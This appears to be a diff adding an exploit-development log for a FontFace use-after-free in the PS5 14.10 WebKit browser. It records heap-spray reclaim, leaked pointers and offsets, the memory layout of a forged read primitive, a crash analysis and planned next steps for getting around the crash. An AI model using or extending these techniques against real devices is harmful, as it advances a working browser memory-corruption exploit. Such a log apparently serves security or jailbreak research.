@@ -1,0 +1,123 @@
+=== PROBE p690: walk-forge-oracle — PS5 14.10 WebKit ===
+Date: 2026-11-09 20:34-20:44 UTC-3
+Target: PS5 14.10 browser (WebKit 605.1.15 / Safari 17.0)
+Probe: p690-walk-forge-oracle.html via chiaki-ng remote play
+Server: serve.py on port 443 (HTTPS)
+
+== SUMMARY ==
+
+5 runs total. Run 4 (O73QK6) achieved PARTIAL SUCCESS:
+  - FontFace UAF trigger + spray reclaim: SUCCESS (1 buffer)
+  - L1 (hash table ptr) leak: SUCCESS — 0x1000891e60
+  - L2 (WeakPtrImpl*) leak: SUCCESS — 0x1000804200
+  - Oracle (check() pattern-match): ALIVE for self-scan, DEAD for boundary()
+  - Self-discovery (spray buffer VA): SUCCESS — 0x1000384480
+  - VTAB (adjacent buffer): SUCCESS — 0x1000384100 (buffer j0, -14*64B from SELF)
+  - W1 vtable chain read via forgeRead(): CRASH (WebProcess died)
+  - Walk forge / face.style trigger: NOT REACHED
+
+== CRASH ANALYSIS ==
+
+forgeRead(L1-0x10, 80) modifies the spray buffer to redirect face.style
+to read 80 bytes from the hash table region. It writes:
+  +0x08 = self+0x70  (overwrites CSSFontFace member)
+  +0x30 = 4
+  +0x34 = 80 (length)
+  +0x38 = L1-0x10 (target address)
+  +0x70..+0x98 = forged property serialization chain
+
+The engine actively reads CSSFontFace fields during layout (the face was
+re-added to document.fonts and is in the font set). Changing +0x08 to a
+forged pointer triggers an IMMEDIATE crash before the 70ms setTimeout
+callback fires. No W1-PRE-RD synchronous beacon was received.
+
+ROOT CAUSE: The style-read mechanism is unsafe because the engine
+dereferences CSSFontFace fields between the buffer write and the
+explicit face.style read. The fields at +0x08, +0x70, +0x7A, +0x90,
++0x98 are actively accessed by the engine's layout/rendering thread.
+
+== RUN-BY-RUN ==
+
+Run 1 (R4UDWW, 20:34:16): VER+BOOT only, no trigger (cold page)
+Run 2 (7ZGDTS, 20:36:25): VER+BOOT only, no trigger
+Run 3 (DOF0A5, 20:37:35): RES-n2, L1=0x0, L2=0x0 → NOLEAK (spray missed)
+Run 4 (O73QK6, 20:41:41): PARTIAL SUCCESS — see below
+Run 5 (S7ANGN, 20:44:09): VER+BOOT only (auto-reload after crash)
+
+== RUN 4 (O73QK6) DETAILED TIMELINE ==
+
+20:41:41.943  BOOT-O73QK6,ctl=0
+20:41:41.950  RES-n2  (promise resolved, 2 faces)
+20:41:41.997  L1-0x1000891e60  (hash table pointer LEAKED)
+20:41:42.007  L2-0x1000804200  (WeakPtrImpl* LEAKED)
+20:41:42.021  FORGED-1  (1 spray buffer reclaimed CSSFontFace slot)
+20:41:42.043  FAMILY-OK  (face renamed to zz0)
+20:41:42.082  ADD-OK  (face re-added to document.fonts)
+20:41:42.333  DIAG: chk0=false,chk41=false,chk100=false (boundary oracle dead)
+20:41:42.405  PH2-START (7 b0 candidates)
+20:41:42.429  A-DEAD  (boundary() returned -1, m_status=0 makes all in-range false)
+20:41:42.500  DIAG: bufs=1, fam=zz0, zi=0
+20:41:42.583  DIAG: ptr20=0x1000804207 (L2 still at +0x20)
+20:41:42.609  PH3 oracle sweep begins (570 readings over ~13s)
+20:41:42.669  DIAG: L2=0x1000804200, cnt=1, cap=1
+20:41:42.795  PH2-SKIP-DEAD
+20:41:43.086  INTABLE-zz0  (face IS in font table)
+20:41:43.253  PH3-START (b4=16, full self-scan)
+20:41:48.578  PH2-FRESH (scan state reset)
+20:41:51.220  PH2-END (ntry=0 — skipped because oracle dead)
+20:41:52.421  VTAB-0x1000384100-j0 (adjacent buffer found, 14*64=896B below SELF)
+20:41:53.024  W1-START (si=1)
+20:41:54.310  SELF-0x1000384480 (spray buffer VA discovered!)
+              ... forgeRead() called, buffer layout modified ...
+              ... WebProcess CRASHED (no further beacons) ...
+20:41:55.440  Last queued async PH3 beacon delivered
+20:44:09.355  New BOOT (page auto-reloaded after crash)
+
+== ORACLE MECHANISM ==
+
+The check() oracle works in TWO modes:
+1. boundary() — binary search for exact byte values via UnicodeRange
+   DEAD in this run: L2+0x07 encoded a range including char 0
+2. Pattern match — check specific codepoints against known marker values
+   ALIVE: self-scan used {from=0x1000, to=0x2000} marker at +0x38..+0x3F
+
+The pattern-match oracle enabled self-discovery and VTAB detection even
+when boundary() failed. This dual-mode design is robust.
+
+== ADDRESSES DISCOVERED ==
+
+  L1 (hash table)      = 0x1000891e60  (engine-written at CSSFontFace+0x58)
+  L2 (WeakPtrImpl*)    = 0x1000804200  (engine-written at CSSFontFace+0x68)
+  SELF (spray buffer)  = 0x1000384480  (found via +0x38 marker oracle)
+  VTAB (adjacent buf)  = 0x1000384100  (14 positions below SELF)
+  SKIPJ                = 0             (buffer index used for external vtable)
+
+Address relationships:
+  SELF - VTAB = 0x380 = 896 bytes = 14 * 64B (14 spray-buffer positions)
+  L1 region ~5.3 MB above SELF
+  L2 region ~4.9 MB above SELF
+
+== WHAT WORKS ==
+
+1. FontFace UAF trigger + 192B ArrayBuffer spray reclaim
+2. L1/L2 leak from engine-written fields (+0x58, +0x68)
+3. check() pattern-match oracle for in-buffer markers
+4. Self-discovery of spray buffer VA
+5. Adjacent buffer detection for external vtable storage
+
+== WHAT CRASHED ==
+
+forgeRead() style-read mechanism. The engine actively dereferences
+CSSFontFace members during layout, so modifying +0x08 (and other
+fields) for a redirected face.style read crashes immediately.
+
+== NEXT STEPS ==
+
+1. Remove face from document.fonts BEFORE forgeRead to prevent layout access
+2. Or: use check() oracle ONLY (no face.style) for memory reads
+3. Or: find which specific field causes the crash and avoid modifying it
+4. The walk-forge layout (Step 9) was never tested — the crash is earlier
+
+== BEACON LOG ==
+
+Full beacon log: p690_walk_forge_oracle_20261109_204155.log (604 lines, 38KB)
